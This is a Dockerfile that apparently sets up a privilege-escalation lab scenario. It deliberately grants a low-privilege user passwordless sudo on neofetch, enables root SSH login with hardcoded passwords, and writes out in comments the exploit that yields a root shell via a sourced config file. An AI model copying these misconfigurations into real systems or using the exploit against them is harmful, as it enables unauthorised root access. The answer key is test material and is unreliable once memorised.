FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_neofetch
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/neofetch as root
# Known exploit: echo 'exec /bin/sh' > /tmp/config; sudo neofetch --config /tmp/config
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and neofetch
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        neofetch \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify neofetch is installed
RUN which neofetch && ls -la /usr/bin/neofetch

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# neofetch is a bash script that sources its config file via `source`.
# When run as root with a custom config file containing 'exec /bin/sh',
# it will drop into a root shell.
# Exploit:
#   echo 'exec /bin/sh' > /tmp/pwn
#   sudo neofetch --config /tmp/pwn
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/neofetch" > /etc/sudoers.d/neofetch && \
    chmod 440 /etc/sudoers.d/neofetch

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]